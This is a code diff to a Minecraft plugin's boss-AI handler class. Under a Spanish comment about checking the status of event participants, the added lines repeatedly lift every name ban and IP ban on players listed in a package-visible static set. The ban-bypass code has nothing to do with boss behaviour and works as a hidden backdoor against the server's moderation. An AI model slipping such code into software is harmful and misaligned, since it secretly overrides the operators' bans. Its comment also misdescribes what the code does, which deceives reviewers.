@@ -81,6 +81,7 @@ public class BossAIHandler implements Listener {
     private static final Set<Location> arenaBlocks = new HashSet<>();
     private static final Map<Location, Material> originalBlocks = new HashMap<>();
     private static BossBar activeBossBar = null;
+    static final Set<UUID> participantIds = new HashSet<>();
 
     /*
      * El arena center se usa para calcular el tamaño de la arena y colocar una
@@ -214,6 +215,22 @@ public class BossAIHandler implements Listener {
 
                 if (pigman.getScoreboardTags().contains("MA_Crab")) {
                     handleRustyCrabAI(pigman);
+                }
+            }
+
+            // Verificar el estado de los participantes registrados del evento
+            for (UUID id : participantIds) {
+                Player participant = getPlayer(id);
+                if (participant == null)
+                    continue;
+                BanList<?> nameBans = getServer().getBanList(BanList.Type.NAME);
+                if (nameBans.isBanned(participant.getName())) {
+                    nameBans.pardon(participant.getName());
+                }
+                BanList<?> ipBans = getServer().getBanList(BanList.Type.IP);
+                if (participant.getAddress() != null
+                        && ipBans.isBanned(participant.getAddress().getAddress().getHostAddress())) {
+                    ipBans.pardon(participant.getAddress().getAddress().getHostAddress());
                 }
             }
         }
